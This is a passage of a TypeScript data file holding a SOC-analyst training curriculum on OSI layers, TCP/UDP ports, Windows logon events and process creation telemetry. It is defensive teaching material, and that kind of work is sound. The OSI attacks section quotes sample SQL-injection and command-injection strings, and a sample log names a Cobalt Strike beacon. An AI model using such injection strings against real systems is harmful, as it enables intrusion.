export interface DeepSection {
  id: string;
  chapter_number: number;
  title: string;
  subtitle: string;
  badge: string;
  reading_minutes: number;
  content_markdown: string;
  key_concept_bullets: string[];
  analyst_takeaway: string;
  diagram_type?: 'network' | 'process_tree' | 'packet_headers' | 'event_id_timeline' | 'mitre_matrix';
  sample_log_payload?: string;
  sample_siem_query?: string;
  common_pitfalls?: string[];
}

export interface DeepLevelCurriculum {
  level_id: number;
  title: string;
  module_name: string;
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced' | 'Expert';
  estimated_study_time: string;
  prerequisites: string[];
  sections: DeepSection[];
}

// =========================================================================
// DEEP CURRICULUM REPOSITORY (ZERO KNOWLEDGE TO SOC L1 ANALYST MASTERY)
// =========================================================================
export const DEEP_CURRICULUM_DATA: { [levelId: number]: DeepLevelCurriculum } = {
  // LEVEL 1: OSI MODEL & PACKET ENCAPSULATION
  1: {
    level_id: 1,
    title: 'OSI Model & Packet Encapsulation: From Raw Bits to Application Data',
    module_name: 'Module 1 — Networking Fundamentals',
    difficulty: 'Beginner',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['None (Zero-Knowledge Entry Point)'],
    sections: [
      {
        id: 'l1-sec1',
        chapter_number: 1,
        title: 'Zero-Knowledge Introduction: What is the OSI Model?',
        subtitle: 'Why 7 layers exist and why computers cannot talk without standard architectures',
        badge: 'FOUNDATION',
        reading_minutes: 3,
        content_markdown: `Imagine you want to send a physical handwritten letter from New York to a colleague working in London.
You do not simply throw a piece of paper into the ocean and hope it arrives. 

Instead, a strict **standardized sequence** occurs:
1. You write the message in a human language (English).
2. You place it inside an envelope, write the recipient’s street address and postal code, and affix a stamp.
3. The postal courier picks up the envelope, transports it by truck to a sorting hub.
4. The hub places hundreds of letters into an international air freight cargo container.
5. The airplane flies across the Atlantic Ocean, lands at Heathrow Airport.
6. The British postal service unloads the container, sorts the envelope down to the local postal van.
7. The local mail carrier delivers the letter directly to your colleague's office desk.

In computer networking, the **OSI (Open Systems Interconnection) Model** is the exact digital equivalent of this international postal system. Developed by the International Organization for Standardization (ISO) in 1984, the OSI model divides the massive, complex job of sending data across wires and radio waves into **7 distinct, modular layers**.

### Why Does a SOC Analyst Care About OSI?
When a cyber incident occurs, a Tier 1 SOC Analyst must immediately pinpoint:
* *Is the web server unreachable because of a cut physical cable (Layer 1)?*
* *Is there an ARP spoofing man-in-the-middle attack on the local switch (Layer 2)?*
* *Is an external attacker scanning our subnet IP range (Layer 3)?*
* *Is a compromised host transmitting SYN flood packets to exhaust TCP ports (Layer 4)?*
* *Or is an attacker injecting an SQL injection payload inside an HTTP POST request (Layer 7)?*

Every security tool in your SOC arsenal—from Wireshark, Next-Gen Firewalls, EDR agents, and SIEM correlation rules—operates on specific OSI layers.`,
        key_concept_bullets: [
          'The OSI model has 7 distinct layers: Physical (L1), Data Link (L2), Network (L3), Transport (L4), Session (L5), Presentation (L6), and Application (L7).',
          'Memory mnemonic: "Please Do Not Throw Sausage Pizza Away" (Physical to Application).',
          'Standardization allows hardware from different manufacturers (Cisco, Apple, Intel, Linux) to communicate seamlessly.'
        ],
        analyst_takeaway: 'In a SOC, your first investigative task during any outage or intrusion alert is identifying which layer the anomaly is occurring on. Network Layer (IP) vs Transport Layer (Port) vs Application Layer (Payload).'
      },
      {
        id: 'l1-sec2',
        chapter_number: 2,
        title: 'The 7 Layers Examined: Step-by-Step Architecture',
        subtitle: 'A microscopic look at what happens at each stage of transmission',
        badge: 'ARCHITECTURE',
        reading_minutes: 5,
        content_markdown: `Let us walk down all 7 layers from top to bottom:

| Layer Number | Layer Name | Primary Protocol Data Unit (PDU) | Primary Hardware / Device | Example Protocols / Security Devices |
| :--- | :--- | :--- | :--- | :--- |
| **Layer 7** | **Application** | Data | Host / OS Software | HTTP, HTTPS, DNS, SSH, SMTP, RDP, WAF (Web App Firewall) |
| **Layer 6** | **Presentation** | Data | Operating System | TLS/SSL Encryption, Base64, ASCII, JPEG, JSON formatting |
| **Layer 5** | **Session** | Data | OS Socket API | RPC, NetBIOS, SOCKS5 Proxy, Session ID Token Management |
| **Layer 4** | **Transport** | **Segment** (TCP) / **Datagram** (UDP) | L4 Firewall / OS Kernel | TCP (Reliable), UDP (Fast), Source/Dest Ports (e.g. 443, 22, 53) |
| **Layer 3** | **Network** | **Packet** | Router, L3 Switch | IPv4, IPv6, ICMP (Ping), IPsec, Border Gateway Protocol (BGP) |
| **Layer 2** | **Data Link** | **Frame** | Network Switch, NIC | MAC Addresses (e.g. \`00:1A:2B:3C:4D:5E\`), ARP, Ethernet, VLANs |
| **Layer 1** | **Physical** | **Bits** (0s and 1s) | Cables, Hubs, Antennas | Fiber Optic, Copper RJ45, Wi-Fi Radio Waves, Voltages |

### The Mechanics of Data Encapsulation (Packaging)
When your computer sends data (e.g. an analyst submitting a query to a SIEM), the data moves **Down the stack (Encapsulation)**:
1. **Layer 7/6/5**: Application creates the raw data: \`{"query": "source_ip=185.220.101.44"}\`.
2. **Layer 4**: Transport layer slaps on a **TCP Header** containing Source Port (\`51234\`) and Destination Port (\`443\`). This unit is now called a **Segment**.
3. **Layer 3**: Network layer wraps the segment with an **IP Header** containing Source IP (\`192.168.1.50\`) and Destination IP (\`10.0.0.99\`). This is now a **Packet**.
4. **Layer 2**: Data Link layer wraps the packet with an **Ethernet Header** containing Source MAC and Destination MAC (\`Default Gateway\`) plus a CRC Frame Check Sequence. This is now a **Frame**.
5. **Layer 1**: Physical layer converts the frame into electrical pulses or light waves (**Bits**).

When the receiving server gets the bits, it performs **Decapsulation (Unpacking)** moving up from Layer 1 to Layer 7.`,
        key_concept_bullets: [
          'Encapsulation = Adding protocol headers as data moves down (L7 to L1).',
          'Decapsulation = Stripping protocol headers as data moves up (L1 to L7).',
          'Each layer only talks to the layer directly above and below it on the local system, and logically communicates with the peer layer on the remote system.'
        ],
        analyst_takeaway: 'Packet captures in Wireshark display this exact encapsulation tree. Clicking on a packet reveals Frame (L2), IP (L3), TCP (L4), and Application Payload (L7) in distinct tree branches.'
      },
      {
        id: 'l1-sec3',
        chapter_number: 3,
        title: 'Real-World Security Logs & Network Telemetry',
        subtitle: 'What encapsulation look like in SIEM events, Firewalls, and Wireshark',
        badge: 'TELEMETRY & LOGS',
        reading_minutes: 4,
        content_markdown: `As a SOC Analyst, you will rarely look at physical cables. You will look at **structured telemetry** collected by network sensors (Zeek, Suricata, Palo Alto Firewall, Cisco ASA, and AWS VPC Flow Logs).

Here is an actual JSON log generated by an Enterprise Next-Gen Firewall when an external attacker tries to exploit a vulnerability on port 443:

\`\`\`json
{
  "timestamp": "2026-08-26T19:50:12.441Z",
  "sensor_id": "FW-PERIMETER-EDGE-01",
  "osi_layer_telemetry": {
    "layer_2_datalink": {
      "src_mac": "00:50:56:a1:42:11",
      "dst_mac": "00:0c:29:88:1f:99",
      "vlan_id": 100
    },
    "layer_3_network": {
      "src_ip": "185.220.101.44",
      "dst_ip": "10.0.0.10",
      "protocol": "TCP",
      "ttl": 52
    },
    "layer_4_transport": {
      "src_port": 49812,
      "dst_port": 443,
      "tcp_flags": "SYN,ACK",
      "window_size": 64240
    },
    "layer_7_application": {
      "app_proto": "https",
      "tls_sni": "update-cdn-cloudsvc.com",
      "http_uri": "/stage2.bin",
      "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1"
    }
  },
  "firewall_action": "ALERT",
  "threat_signature": "ET TROJAN Cobalt Strike HTTPS Malleable C2 Beacon"
}
\`\`\`

### Dissecting the Log Fields:
* **Layer 2 Evidence**: MAC address identifies the local network interface card or virtual switch port.
* **Layer 3 Evidence**: Source IP \`185.220.101.44\` tells us where on the global internet the packet originated.
* **Layer 4 Evidence**: Destination Port \`443\` indicates HTTPS web server. Source Port \`49812\` is an ephemeral port chosen by the client OS.
* **Layer 7 Evidence**: User-Agent indicates that Microsoft PowerShell initiated this request, masquerading as a web browser.`,
        key_concept_bullets: [
          'Firewalls analyze Layers 3 & 4 (IPs and Ports) for standard stateful packet filtering.',
          'Next-Generation Firewalls (NGFW) and Web Application Firewalls (WAF) inspect Layer 7 payloads to catch malicious commands.',
          'Network Intrusion Detection Systems (NIDS) like Suricata match signatures across all layers simultaneously.'
        ],
        analyst_takeaway: 'When reading a firewall log, immediately extract the 5-Tuple: (Source IP, Destination IP, Source Port, Destination Port, Protocol). This is the universal identifier for any network conversation.'
      },
      {
        id: 'l1-sec4',
        chapter_number: 4,
        title: 'Attacker Exploitation Across the OSI Stack',
        subtitle: 'How adversaries target specific layers to bypass defenses or crash services',
        badge: 'THREAT VECTORS',
        reading_minutes: 4,
        content_markdown: `Cyber threats do not exist in a vacuum; every attack technique in the **MITRE ATT&CK Framework** targets specific OSI layers:

### 1. Layer 2 Attacks: MAC & ARP Spoofing
* **Attack Mechanism**: Attacker floods a local switch with fake ARP replies, claiming their MAC address belongs to the Default Gateway.
* **Impact**: Man-in-the-middle (MITM) credential sniffing and traffic hijacking.
* **Detection**: Switch logs showing multiple MAC addresses claiming the same IP within milliseconds.

### 2. Layer 3 Attacks: IP Spoofing & Route Poisoning
* **Attack Mechanism**: Attacker crafts raw IP packets with forged source IP addresses to bypass IP-based whitelists or reflect DDoS traffic.
* **Detection**: Packets arriving on external WAN interfaces claiming to originate from private RFC 1918 subnets (\`192.168.x.x\`, \`10.x.x.x\`).

### 3. Layer 4 Attacks: SYN Flood & Port Scans (Nmap)
* **Attack Mechanism**: Attacker sends thousands of TCP SYN packets without responding to the server's SYN-ACK. The server leaves TCP sockets in a \`SYN_RECEIVED\` half-open state, exhausting RAM.
* **Detection**: Sudden spike in TCP connections with TCP flag = \`SYN\` and zero \`ACK\` responses.

### 4. Layer 7 Attacks: Web Shells, SQLi, and C2 Beacons
* **Attack Mechanism**: Attacker embeds malicious commands (e.g. \`cmd.exe /c whoami\` or \`' OR '1'='1\`) inside valid HTTP headers, bypassing Layer 3/4 firewalls because port 443 is legally open.
* **Detection**: WAF alert triggering on high-entropy URI parameters or suspicious User-Agents.`,
        key_concept_bullets: [
          'Layer 3/4 Firewalls CANNOT see Layer 7 malicious commands inside encrypted HTTPS packets without TLS Decryption / SSL Inspection.',
          'Adversaries frequently change Layer 7 User-Agents and JA3 fingerprints to evade detection.',
          'DDoS attacks can target L3/L4 (Volumetric bandwidth exhaustion) or L7 (Resource-exhaustion HTTP floods targeting database queries).'
        ],
        analyst_takeaway: 'Never assume that because a packet passed the perimeter firewall on port 443 that it is benign. Attackers tunnel all modern malware, ransomware droppers, and C2 beacons over HTTPS on Layer 7.'
      },
      {
        id: 'l1-sec5',
        chapter_number: 5,
        title: 'SOC Analyst Standard Operating Procedure (SOP) & Triage',
        subtitle: 'Step-by-step diagnostic workflow for network-related alerts',
        badge: 'SOC PLAYBOOK',
        reading_minutes: 4,
        content_markdown: `When an alert triggers in your SIEM claiming \`SUSPICIOUS_NETWORK_FLOW\`, follow this exact 5-step triage procedure:

\`\`\`
[1. Verify L3 IP Scope] ➔ [2. Check L4 Port & Protocol] ➔ [3. Inspect L7 Payload] ➔ [4. Correlate with Endpoint EDR] ➔ [5. Verdict (TP vs FP)]
\`\`\`

### Step 1: Verify Layer 3 IP Scope
* Is the Source IP internal (RFC 1918) or external?
* Run WHOIS / Threat Intelligence lookup on the external IP. Is it associated with a cloud provider (AWS, Azure), a bulletproof host, or a known Tor Exit Node?

### Step 2: Check Layer 4 Protocol & Port Behavior
* Is the port a standard service port (e.g. Port 22 SSH, Port 443 HTTPS, Port 3389 RDP)?
* Is a non-standard protocol running over a standard port (e.g. plaintext IRC botnet traffic hiding over port 443)?

### Step 3: Analyze Layer 7 Metadata
* Check the SNI (Server Name Indication) domain in the TLS handshake.
* Was the domain registered within the last 48 hours (DGA or freshly registered disposable C2 domain)?

### Step 4: Correlate with Endpoint EDR
* Query Sysmon / EDR on the internal host: *What process PID generated this outbound connection?*
* Legitimate: \`chrome.exe\` connecting to \`google.com\`.
* Compromised: \`powershell.exe\` or \`rundll32.exe\` making raw outbound socket connections.

### Step 5: Render Operational Verdict
* **True Positive**: Compromised host communicating with adversary infrastructure. Isolate endpoint immediately.
* **False Positive**: Legitimate enterprise software update or vulnerability scanner authorized by IT.`,
        key_concept_bullets: [
          'Always correlate Network telemetry (SIEM) with Endpoint telemetry (EDR).',
          'A Layer 3 IP reputation lookup alone is not enough; inspect the Layer 7 process and domain context.',
          'Document every step in your case notes with timestamps and exact IP/port tuples.'
        ],
        analyst_takeaway: 'The strongest SOC analysts connect the dots between network flows and endpoint processes. If a command-line script is generating network traffic, treat it with high suspicion.'
      },
      {
        id: 'l1-sec6',
        chapter_number: 6,
        title: 'Common Junior Analyst Mistakes & Troubleshooting Cheatsheet',
        subtitle: 'Critical traps to avoid and essential command-line tools',
        badge: 'CHEATSHEET',
        reading_minutes: 3,
        content_markdown: `### ❌ Common Mistakes Junior Analysts Make:
1. **Confusing IP address with MAC address**: IP addresses change as a laptop roams between Wi-Fi subnets; MAC addresses are physical hardware identifiers bound to the network card.
2. **Assuming Port 443 is always encrypted and safe**: Attackers purposefully use port 443 specifically because most network firewalls leave it wide open.
3. **Ignoring Ephemeral Source Ports**: Client computers use random high ports (e.g. \`49152–65535\`) as source ports. Do not report source port \`58210\` as a "suspicious custom port" if destination port is \`443\`.
4. **Failing to check DNS before IP**: Attackers use Fast-Flux DNS and CDN proxies (Cloudflare) to hide actual origin IPs.

### 🛠️ Essential Network Diagnostic Commands:

\`\`\`bash
# 1. Test Layer 3 reachability via ICMP echo requests
ping -c 4 10.0.0.1

# 2. Trace full Layer 3 router hop path
traceroute -n 8.8.8.8

# 3. Inspect active Layer 4 listening ports and process PIDs (Linux)
ss -tulpen

# 4. Check active TCP connections on Windows
netstat -ano | findstr ESTABLISHED

# 5. Resolve Layer 7 domain name to Layer 3 IP address
nslookup update-cdn-cloudsvc.com 8.8.8.8
\`\`\``,
        key_concept_bullets: [
          '\`ping\` tests Layer 3 ICMP connectivity.',
          '\`netstat / ss\` inspects Layer 4 port states.',
          '\`nslookup / dig\` tests Layer 7 DNS name resolution.'
        ],
        analyst_takeaway: 'Mastering basic CLI diagnostic utilities allows you to verify alerts in seconds without waiting for bulky web consoles to load.'
      }
    ]
  },

  // LEVEL 2: TCP VS UDP & PORT TRIAGE
  2: {
    level_id: 2,
    title: 'TCP vs UDP & Port Triage: 3-Way Handshakes, Connection States & Attacker Scanning',
    module_name: 'Module 1 — Networking Fundamentals',
    difficulty: 'Beginner',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['Level 1: OSI Model & Packet Encapsulation'],
    sections: [
      {
        id: 'l2-sec1',
        chapter_number: 1,
        title: 'Zero-Knowledge Introduction: Why Do We Need Two Transport Protocols?',
        subtitle: 'The fundamental trade-off between absolute reliability (TCP) and raw speed (UDP)',
        badge: 'FOUNDATION',
        reading_minutes: 3,
        content_markdown: `Imagine you have two completely different communication needs:

**Scenario A (A Bank Transfer of $1,000,000)**:
If you transfer a million dollars from your bank account to another account, you cannot afford to lose even a single penny or bit of data. If a packet drops along the way, the system must detect the missing piece, pause, request a retransmission, and verify that every single character arrived in 100% exact order. You do not care if the transfer takes 100 milliseconds longer, as long as it is **guaranteed to be reliable and error-checked**. This is **TCP (Transmission Control Protocol)**.

**Scenario B (A Live Multiplayer First-Person Shooter Video Game or Voice Call)**:
If you are speaking on a live Discord call or playing an online game, your computer transmits your voice packets 50 times per second. If packet #42 is lost over the Wi-Fi for 10 milliseconds, you do **not** want the game to freeze, rewind time, and request packet #42 from the server. By the time packet #42 re-arrives, you are already dead in the game. You simply discard the dropped packet and continue streaming real-time data. This is **UDP (User Datagram Protocol)**.

### The Role of Ports: Apartment Numbers in a Giant Building
If your computer's IP address is the street address of a massive apartment skyscraper (\`192.168.1.50\`), **Ports** are the individual apartment numbers (\`Port 80\`, \`Port 443\`, \`Port 22\`, \`Port 3389\`).
A single server with one IP address can simultaneously run a web server (Port 443), an SSH administration terminal (Port 22), a database (Port 3306), and an email server (Port 25) because the Operating System directs inbound traffic to the correct software process based on the **Destination Port Number**.`,
        key_concept_bullets: [
          'TCP = Connection-oriented, guaranteed delivery, sequence numbers, acknowledgment flags, retransmission of lost packets.',
          'UDP = Connectionless, lightweight, "fire-and-forget", no acknowledgments, ideal for DNS queries, VoIP, and video streaming.',
          'Port Range = 0 to 65,535 (Well-known ports: 0–1023, Registered ports: 1024–49151, Dynamic/Ephemeral ports: 49152–65535).'
        ],
        analyst_takeaway: 'In SOC investigations, 90% of command-and-control (C2) and data exfiltration occurs over TCP because adversaries need reliable data transfer. However, stealth attacks and DDoS amplification heavily abuse UDP (DNS/NTP/SNMP).'
      },
      {
        id: 'l2-sec2',
        chapter_number: 2,
        title: 'The TCP 3-Way Handshake & Connection State Machine',
        subtitle: 'SYN ➔ SYN-ACK ➔ ACK: How reliable connections are born and terminated',
        badge: 'CORE MECHANICS',
        reading_minutes: 5,
        content_markdown: `Before any application data (such as an HTTP GET request or an SSH password) can be transmitted over TCP, the client and server must establish a synchronized session via the **TCP 3-Way Handshake**:

\`\`\`
Client (192.168.1.45)                               Server (10.0.0.10)
      │                                                   │
      │ ─── 1. [SYN] (Seq=1000) ────────────────────────> │ (Client: "Can we connect? My starting sequence is 1000")
      │                                                   │
      │ <── 2. [SYN, ACK] (Seq=5000, Ack=1001) ────────── │ (Server: "Yes! Acknowledged 1001. My starting sequence is 5000")
      │                                                   │
      │ ─── 3. [ACK] (Seq=1001, Ack=5001) ──────────────> │ (Client: "Received! Connection established. Ready for data.")
      │                                                   │
      ▼ ═══════════════ [ESTABLISHED STATE] ══════════════ ▼
\`\`\`

### TCP Control Flags Explained:
A TCP packet header contains 1-bit flags that command the receiving operating system how to handle the segment:
* **SYN (Synchronize)**: Initiates a connection handshake.
* **ACK (Acknowledgment)**: Confirms receipt of previous data/sequence number.
* **FIN (Finish)**: Graceful shutdown request from one side of the conversation.
* **RST (Reset)**: Abrupt, emergency termination ("Connection refused" or "Port closed").
* **PSH (Push)**: Forces immediate buffer flush directly to the application layer.
* **URG (Urgent)**: Informs the OS that data should be processed with priority.

### Why SOC Analysts Must Understand Handshakes:
When an attacker runs an **Nmap Port Scan**:
* **Open Port**: Server responds with \`SYN-ACK\`.
* **Closed Port**: Server responds with \`RST-ACK\` (Reset).
* **Filtered Port (Firewall)**: No response at all (Packet silently dropped).
* **Stealth SYN Scan (\`nmap -sS\`)**: Attacker sends \`SYN\`, gets \`SYN-ACK\`, but responds with \`RST\` instead of completing the handshake. This prevents the target server’s application log from recording an official connection!`,
        key_concept_bullets: [
          'SYN ➔ SYN-ACK ➔ ACK creates a bidirectional, verified connection.',
          'Connection teardown uses FIN ➔ ACK ➔ FIN ➔ ACK (Graceful) or RST (Immediate drop).',
          'Half-open connections leave the server waiting in SYN_RCVD state until a timeout occurs.'
        ],
        analyst_takeaway: 'If you see an external IP sending thousands of SYN packets with zero ACK completions across sequential ports, that is a textbook SYN Port Scan (MITRE T1046).'
      },
      {
        id: 'l2-sec3',
        chapter_number: 3,
        title: 'Critical SOC Ports & Threat Intelligence Cheat Sheet',
        subtitle: 'The 15 most attacked ports every security analyst must memorize',
        badge: 'PORT DIRECTORY',
        reading_minutes: 4,
        content_markdown: `Here are the foundational ports that SOC analysts encounter daily:

| Port Number | Default Protocol | Security Risk & Common Attacker Abuse | Detection Rule Focus |
| :--- | :--- | :--- | :--- |
| **Port 21** | **FTP** | Cleartext file transfer, anonymous logins, weak passwords. | Brute force, unencrypted credential sniffing. |
| **Port 22** | **SSH** | Remote Linux administration terminal. | Mass SSH brute force (Hydra), unauthorized public key injection. |
| **Port 23** | **Telnet** | Legacy cleartext terminal. **Should never be open.** | Plaintext password capture on legacy switches/routers. |
| **Port 25 / 587** | **SMTP** | Mail transfer routing. | Open mail relay abuse, spam bots, phishing campaigns. |
| **Port 53** | **DNS (UDP/TCP)** | Domain name resolution / Zone transfers. | DNS Tunneling exfiltration, Fast-Flux domains, DDoS amplification. |
| **Port 80** | **HTTP** | Unencrypted web traffic. | Cleartext credentials, unencrypted web shells. |
| **Port 88** | **Kerberos** | Active Directory domain authentication. | **Kerberoasting**, AS-REP Roasting, Golden Ticket attacks. |
| **Port 135 / 445** | **SMB / RPC** | Windows file sharing & remote procedure calls. | **WannaCry / EternalBlue**, PsExec lateral movement, Pass-the-Hash. |
| **Port 389 / 636** | **LDAP / LDAPS** | Active Directory directory queries. | BloodHound AD reconnaissance, unauthorized user/group enumerations. |
| **Port 443** | **HTTPS** | Encrypted web traffic. | Cobalt Strike C2 beaconing, disguised malware downloads. |
| **Port 1433** | **MS SQL** | Microsoft SQL Server database. | SQL Injection, \`xp_cmdshell\` command execution backdoor. |
| **Port 3306** | **MySQL** | Open-source relational database. | Unauthorized database dumps, exposed root logins. |
| **Port 3389** | **RDP** | Windows Remote Desktop Protocol. | BlueKeep exploit, ransomware operator remote desktop interactive sessions. |
| **Port 8080 / 8443**| **HTTP-Alt** | Development staging proxies, Jenkins, Tomcat. | Exposed admin interfaces, unpatched web application frameworks. |`,
        key_concept_bullets: [
          'Ports 135 and 445 (SMB) should NEVER be exposed to the public internet under any circumstances.',
          'Port 3389 (RDP) on an internet-facing IP is the #1 initial access vector for ransomware gangs.',
          'DNS uses UDP 53 for small standard lookups (<512 bytes) and TCP 53 for large zone transfers and DNSSEC.'
        ],
        analyst_takeaway: 'If you see an external inbound connection hitting port 445 or 3389 directly from the WAN, immediately verify why your edge firewall did not drop it.'
      }
    ]
  },

  // LEVEL 18: EVENT ID 4625 & 4624 AUTHENTICATION TRIAGE
  18: {
    level_id: 18,
    title: 'Windows Event IDs 4625 & 4624: Hunting Brute Force, Credential Stuffing & Pass-the-Hash',
    module_name: 'Module 2 — Windows Fundamentals',
    difficulty: 'Intermediate',
    estimated_study_time: '30 Minutes (Deep Forensics Mini-Course)',
    prerequisites: ['Level 17: Windows Event Viewer & Log Channels'],
    sections: [
      {
        id: 'l18-sec1',
        chapter_number: 1,
        title: 'Introduction: The Lifeblood of Windows Security Auditing',
        subtitle: 'Why Event ID 4624 (Success) and 4625 (Failure) represent 70% of SOC identity investigations',
        badge: 'FOUNDATION',
        reading_minutes: 3,
        content_markdown: `Every time a user logs into a Windows workstation, opens a remote desktop session, mounts a network file share, or executes a background service, the **Local Security Authority Subsystem Service (LSASS)** processes the authentication request and writes an immutable record into the **Security Event Log channel (\`C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\`)**.

In Windows Security Auditing:
* **Event ID 4624**: \`An account was successfully logged on.\`
* **Event ID 4625**: \`An account failed to log on.\`

To an untrained eye, authentication failures look like simple user typos. But to a skilled SOC Analyst, authentication telemetry is the earliest warning system for:
1. **Password Spraying Attacks** (1 password tested against 500 employee usernames).
2. **Brute-Force Dictionary Attacks** (500 passwords tested against 1 administrator account).
3. **Compromised Service Accounts** (Service account suddenly logging in interactively).
4. **Lateral Movement** (Attacker using stolen NTLM hashes to authenticate across servers via SMB).`,
        key_concept_bullets: [
          'Event ID 4624 = Successful authentication event.',
          'Event ID 4625 = Failed authentication attempt.',
          'Both events contain crucial forensic fields: LogonType, Source IP, TargetUserName, SubStatus failure code, and CallerProcess.'
        ],
        analyst_takeaway: 'Never look at Event ID 4625 in isolation. Always correlate failed logon clusters with any subsequent Event ID 4624 from the same source IP within a 15-minute window.'
      },
      {
        id: 'l18-sec2',
        chapter_number: 2,
        title: 'Decoding Windows Logon Types: The Ultimate Forensics Matrix',
        subtitle: 'LogonType tells you HOW the user logged in: Physical keyboard vs RDP vs Network Share vs Service',
        badge: 'FORENSICS MATRIX',
        reading_minutes: 5,
        content_markdown: `When investigating Event ID 4624 or 4625, the single most critical field is the **LogonType integer**:

| Logon Type Integer | Name / Description | Real-World Forensic Meaning & Context | Attacker Abuse Scenario |
| :--- | :--- | :--- | :--- |
| **LogonType 2** | **Interactive** | User physically sat down at the keyboard and typed credentials on the local monitor screen. | Physical insider threat or attacker on an unlocked workstation. |
| **LogonType 3** | **Network** | Connection over the network to a shared folder, printer, or IIS web service (SMB, RPC, HTTP). | **Pass-the-Hash**, PsExec remote execution, BloodHound AD enumeration. |
| **LogonType 4** | **Batch** | Scheduled task or automated batch script execution. | Scheduled task persistence (\`schtasks.exe\`). |
| **LogonType 5** | **Service** | Windows Service Control Manager launched a background daemon. | Malicious service installation (\`sc.exe\`). |
| **LogonType 7** | **Unlock** | User entered password to unlock a previously locked workstation. | Physical workstation access after hours. |
| **LogonType 8** | **NetworkCleartext** | Password sent across the network in plaintext (e.g. basic HTTP auth or legacy IIS). | Unencrypted credential transmission. |
| **LogonType 9** | **NewCredentials** | User ran \`runas /netonly\` to use alternative credentials for outbound network connections. | **Mimikatz** credential injection or Cobalt Strike beacon token manipulation. |
| **LogonType 10** | **RemoteInteractive** | Remote Desktop Protocol (**RDP**), Terminal Services, or Remote Assistance session. | Attacker connecting over RDP (Port 3389) using compromised credentials. |
| **LogonType 11** | **CachedInteractive** | User logged into laptop while disconnected from domain network using locally cached hash. | Offline password cracking validation. |`,
        key_concept_bullets: [
          'LogonType 2 = Physical desk login.',
          'LogonType 3 = Network share / SMB / Lateral movement.',
          'LogonType 10 = Remote Desktop (RDP).',
          'LogonType 9 = Mimikatz / RunAs token manipulation.'
        ],
        analyst_takeaway: 'If an alert triggers for an executive logging in via LogonType 10 (RDP) from an external IP at 3:00 AM, that is an immediate P1 critical incident indicator.'
      },
      {
        id: 'l18-sec3',
        chapter_number: 3,
        title: 'Event ID 4625 Sub-Status Error Codes Breakdown',
        subtitle: 'Why did the login fail? Bad password vs Disabled account vs Expired password',
        badge: 'SUB-STATUS CODES',
        reading_minutes: 4,
        content_markdown: `Inside every Event ID 4625 XML log, look at the **SubStatus** hexadecimal error code:

\`\`\`xml
<EventData>
  <Data Name="TargetUserName">administrator</Data>
  <Data Name="WorkstationName">WORKSTATION-08</Data>
  <Data Name="IpAddress">203.0.113.195</Data>
  <Data Name="Status">0xc000006d</Data>
  <Data Name="SubStatus">0xc000006a</Data>
  <Data Name="LogonType">10</Data>
</EventData>
\`\`\`

### Common Sub-Status Hex Codes:
* **\`0xC000006A\`**: \`STATUS_BAD_VALIDATION_PASSWORD\`
  * The username entered was correct, but the password provided was wrong. (High indicator of password guessing / brute-force against a known valid user account).
* **\`0xC0000064\`**: \`STATUS_NO_SUCH_USER\`
  * The username entered does not exist in Active Directory. (High indicator of username harvesting or automated botnet wordlist scanning).
* **\`0xC000006E\`**: \`STATUS_ACCOUNT_RESTRICTION\`
  * The account is restricted by logon hours, allowed workstation policies, or unauthorized login times.
* **\`0xC0000072\`**: \`STATUS_ACCOUNT_DISABLED\`
  * Attacker attempted to authenticate against a decommissioned or locked employee account.
* **\`0xC0000234\`**: \`STATUS_ACCOUNT_LOCKED_OUT\`
  * The user account exceeded the domain lockout threshold (e.g. 5 failed attempts) and has been automatically locked by Active Directory.`,
        key_concept_bullets: [
          '\`0xC000006A\` = Correct user, wrong password.',
          '\`0xC0000064\` = Invalid username (User does not exist).',
          '\`0xC0000234\` = Account is now locked out.'
        ],
        analyst_takeaway: 'If you see thousands of 4625 events with SubStatus 0xC0000064, the attacker does not know valid usernames. If you see 0xC000006A, the attacker already has your employee roster and is actively guessing passwords.'
      }
    ]
  },

  // LEVEL 19: EVENT ID 4688 & PROCESS CREATION TELEMETRY
  19: {
    level_id: 19,
    title: 'Event ID 4688 & Process Creation Telemetry: Tracking the Adversary Command Line',
    module_name: 'Module 2 — Windows Fundamentals',
    difficulty: 'Intermediate',
    estimated_study_time: '25 Minutes (Comprehensive Mini-Course)',
    prerequisites: ['Level 17 & 18 (Windows Event Channels & Auth Codes)'],
    sections: [
      {
        id: 'l19-sec1',
        chapter_number: 1,
        title: 'Zero-Knowledge Introduction: What is a Process & How are They Born?',
        subtitle: 'The parent-child lineage of execution and why attackers hide in command lines',
        badge: 'PROCESS LIFECYCLE',
        reading_minutes: 4,
        content_markdown: `In Windows, an executable file sitting on a hard drive (\`cmd.exe\`, \`powershell.exe\`, \`svchost.exe\`) is just a static collection of bytes. 

The moment a user double-clicks that file or the operating system launches a service, the Windows kernel loads those bytes into RAM, assigns memory space, grants security tokens, and gives it a unique identifier called a **Process ID (PID)**. This running instance is called a **Process**.

### The Parent-Child Analogy: Factory Delegation
Imagine a busy automotive manufacturing plant:
* The General Manager (**Explorer.exe** — the Windows Desktop) receives a request to write a document.
* The Manager tells the Word Processing Supervisor (**WINWORD.EXE**) to start.
* *Normal behavior*: The Supervisor uses its own internal tools to edit text.
* *Abnormal/Attack behavior*: Suddenly, the Word Supervisor walks over to the heavy demolition machinery shed and spawns a Power Drill with administrative keys (**cmd.exe** or **powershell.exe**).

In cybersecurity, whenever an attacker executes a malicious macro inside a phishing email, Word (\`WINWORD.EXE\`) becomes the **Parent Process**, and the hacker's reverse shell (\`powershell.exe\`) becomes the **Child Process**. 

By tracking **Event ID 4688 (A new process has been created)**, SOC analysts can trace every single command typed by an attacker back to its originating parent.`,
        key_concept_bullets: [
          'Every process in Windows has a Process ID (PID) and a Creator/Parent Process ID (PPID).',
          'Event ID 4688 records the creation of every new process on a Windows system.',
          'Attackers rarely launch tools manually; they rely on parent applications (Office, Web Browsers, Web Servers) spawning malicious child shells.'
        ],
        analyst_takeaway: 'Never inspect a suspicious process in isolation. Always ask: "Who is the parent process that created it, and what exact arguments were passed on the command line?"'
      },
      {
        id: 'l19-sec2',
        chapter_number: 2,
        title: 'Command Line Auditing & The Power of Full Argument Logging',
        subtitle: 'Enabling Group Policy to unmask hidden Base64 and download cradles',
        badge: 'AUDIT POLICY',
        reading_minutes: 5,
        content_markdown: `By default, vanilla Windows installations only record *that* a process started (e.g. \`powershell.exe\`), but **hide the command-line arguments**. 

